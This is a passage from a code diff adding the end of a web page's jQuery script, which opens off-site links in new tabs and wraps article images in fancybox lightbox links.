+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
